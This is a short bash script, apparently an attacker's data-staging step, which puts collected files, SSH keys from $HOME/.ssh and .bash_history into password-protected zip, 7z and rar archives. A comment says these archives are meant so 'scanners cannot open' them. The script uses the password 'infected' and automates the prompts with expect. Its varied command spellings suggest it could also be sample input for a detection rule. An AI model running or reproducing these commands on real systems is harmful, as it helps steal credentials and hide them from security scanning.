#!/bin/bash
# Stage the collected files in archives that scanners cannot open
zip -P infected123 -r loot.zip "$TARGET"
zip -q -r --password "$ARCHIVE_PASSWORD" notes.zip notes/
zip -rP s3cret docs.zip docs/
7z a -pinfected -mhe=on bundle.7z "$TARGET"
rar a -hpinfected bundle.rar "$TARGET"
ZIP -P infected123 -r keys.zip "$HOME/.ssh"

# These two tools read the password from the terminal, so expect types it
expect <<'EOF'
spawn zip -e history.zip .bash_history
expect "password:"; send "infected\r"; expect "password:"; send "infected\r"; expect eof
spawn zipcloak loot.zip
expect "password:"; send "infected\r"; expect "password:"; send "infected\r"; expect eof
EOF
